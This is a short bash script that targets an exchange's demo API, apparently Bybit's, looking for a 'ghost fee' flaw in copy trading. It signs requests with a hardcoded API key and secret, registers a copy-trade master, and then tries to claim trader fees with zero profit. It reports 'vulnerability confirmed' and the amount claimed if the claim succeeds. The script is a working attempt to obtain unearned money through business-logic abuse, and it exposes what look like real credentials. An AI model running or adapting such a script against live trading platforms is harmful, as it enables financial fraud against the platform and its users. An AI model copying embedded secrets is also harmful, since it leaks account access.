#!/bin/bash
# COPY TRADING GHOST FEES (DEMO BYPASS)
# Demo API: https://api-demo.bybit.com (NO KYC REQUIRED)

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api-demo.bybit.com"  # DEMO API

# Sync Time (demo uses same time server)
OFFSET=$(($(curl -s "https://api.bybit.com/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4) - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

echo "=========================================="
echo "COPY TRADING GHOST FEES (DEMO)"
echo "API: $BASE"
echo "=========================================="

# Step 1: Check if Demo API accepts our keys
echo ""
echo "[0] Testing Demo API Access..."
IFS='|' read -r ts sig <<< $(sign "")
test_resp=$(curl -s "$BASE/v5/user/query-api" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000")

echo "Demo API Response: $test_resp"
test_code=$(echo "$test_resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)

if [ "$test_code" != "0" ]; then
    echo "⚠️  Demo API requires separate keys. Register at demo.bybit.com"
    echo "Continuing with fallback test..."
fi

# Step 2: Try Master Registration (Ghost)
echo ""
echo "[1] Creating Copy Trade Master (Demo)..."
MASTER_PAYLOAD='{"category":"linear","isCopyTrading":true,"symbol":"BTCUSDT"}'
IFS='|' read -r ts sig <<< $(sign "$MASTER_PAYLOAD")

master_resp=$(curl -s -X POST "$BASE/v5/copytrade/master/create" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$MASTER_PAYLOAD")

echo "Master Response: $master_resp"

# Step 3: Try Fee Claim (0 profit)
echo ""
echo "[2] Attempting Ghost Fee Claim..."
CLAIM_PAYLOAD='{"coin":"USDT","profit":"0"}'
IFS='|' read -r ts sig <<< $(sign "$CLAIM_PAYLOAD")

claim_resp=$(curl -s -X POST "$BASE/v5/copytrade/claim" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$CLAIM_PAYLOAD")

echo "Claim Response: $claim_resp"

claim_code=$(echo "$claim_resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
if [ "$claim_code" == "0" ]; then
    echo ""
    echo "🚨🚨🚨 GHOST FEE VULNERABILITY CONFIRMED!"
    echo "Amount claimed: $(echo "$claim_resp" | grep -o '"amount":"[^"]*"')"
    echo "Report this immediately!"
else
    echo "Claim Code: $claim_code"
fi

echo ""
echo "=========================================="
